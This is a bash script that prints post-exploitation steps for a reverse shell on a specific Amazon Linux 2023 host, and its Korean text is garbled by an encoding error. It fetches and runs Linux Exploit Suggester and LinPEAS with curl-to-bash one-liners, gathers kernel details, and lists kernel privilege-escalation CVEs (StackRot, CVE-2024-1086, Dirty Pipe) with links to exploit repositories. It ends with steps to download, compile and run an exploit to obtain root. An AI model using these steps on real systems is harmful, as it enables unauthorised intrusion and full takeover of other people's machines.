#!/bin/bash
echo "============================================================"
echo "π” μλ™ κ¶ν• μƒμΉ μ·¨μ•½μ  νƒμ§€"
echo "============================================================"
echo ""
echo "λ¦¬λ²„μ¤ μ‰μ—μ„ μ‹¤ν–‰:"
echo ""

echo "λ°©λ²• 1: Linux Exploit Suggester (λΉ λ¦„)"
echo "------------------------------------------------------------"
cat << 'EOF'
# /tmpμ— λ‹¤μ΄λ΅λ“
cd /tmp
curl -O https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh

# λλ” ν• μ¤„λ΅
curl https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash
EOF

echo ""
echo "λ°©λ²• 2: LinPEAS (μƒμ„Έν•¨)"
echo "------------------------------------------------------------"
cat << 'EOF'
# λ‹¤μ΄λ΅λ“
cd /tmp
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# λλ” μ§μ ‘ μ‹¤ν–‰
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
EOF

echo ""
echo "λ°©λ²• 3: μλ™ μ²΄ν¬ (curlμ΄ μ• λλ©΄)"
echo "------------------------------------------------------------"
cat << 'EOF'
# Kernel μ •λ³΄ μμ§‘
uname -a > /tmp/sysinfo.txt
cat /etc/os-release >> /tmp/sysinfo.txt
lsb_release -a >> /tmp/sysinfo.txt 2>&1

# κ²°κ³Ό ν™•μΈ
cat /tmp/sysinfo.txt
EOF

echo ""
echo "============================================================"
echo "π“ μ£Όμ” μ²΄ν¬ ν¬μΈνΈ"
echo "============================================================"
echo ""
cat << 'CHECKS'
ν„μ¬ μ‹μ¤ν…:
- Kernel: 6.1.155-176.282.amzn2023.x86_64
- OS: Amazon Linux 2023

κ°€λ¥μ„± μλ” CVE:
1. CVE-2023-3269 (StackRot) - Kernel 6.1-6.4
   https://github.com/lrh2000/StackRot

2. CVE-2024-1086 - Kernel 5.14-6.6
   https://github.com/Notselwyn/CVE-2024-1086

3. Dirty Pipe (CVE-2022-0847) - Kernel 5.8+
   https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits

μλ™ ν™•μΈ:
gcc --version  # μ»΄νμΌλ¬ μλ”μ§€
python3 --version  # Python μλ”μ§€
wget --version  # wget μ‚¬μ© κ°€λ¥ν•μ§€
CHECKS

echo ""
echo "============================================================"
echo "λ‹¤μ λ‹¨κ³„:"
echo "============================================================"
echo ""
echo "1. linux-exploit-suggester.sh μ‹¤ν–‰"
echo "2. μ¶”μ²λ CVE ν™•μΈ"
echo "3. ν•΄λ‹Ή exploit λ‹¤μ΄λ΅λ“ λ° μ»΄νμΌ"
echo "4. μ‹¤ν–‰ν•μ—¬ root κ¶ν• νλ“!"
echo ""
echo "============================================================"
